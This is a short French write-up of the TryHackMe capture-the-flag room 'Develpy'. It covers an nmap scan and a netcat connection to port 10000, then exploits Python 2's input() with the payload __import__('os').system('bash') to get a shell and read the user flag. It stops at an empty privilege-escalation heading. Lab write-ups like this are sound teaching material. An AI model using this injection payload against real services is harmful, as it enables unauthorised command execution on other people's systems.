# Develpy-Write-up
Write-up Room Develpy Tryhackme


Cliquez [ici](https://tryhackme.com/room/bsidesgtdevelpy) pour accéder au room.

# Première étape : Identifier la cible et ses vulnérabilités.

On commence par un scan de port avec nmap.

```bash

nmap -sS -A -Pn [IP]
```


![](img/Develpy_scan.png?raw=true) 

On voit q'au niveau du port 10000 il y a un petit script python qui tourne.
On se connecte au serveur pour voir ce que ça va donner.


```bash

nc [IP] 10000
```
![](img/Develpy_nc0.png?raw=true)

>Ce script est écrit en python mais dans quelle version de python?
>On voit aussi que le module input est utilisé.
>S'il s'agit de python2 ,alors les commandes qu'on enverra au module input seront exécutées car le module input de python2 est vulnérable.

# Deuxième étape : exploitation de vulnérabilité

Dans ce cas c'est bien python2 qui est utilisé.

```python
__import__('os').system('bash')
```
La commande marche bien à merveille.

![](img/Develpy_nc.png?raw=true)

On est mainténant loggé sur le user king.

```bash
cat user.txt
```
Avec la commande ci-dessus on a le premier flag.


# Troisième étape : Escalade de privilège

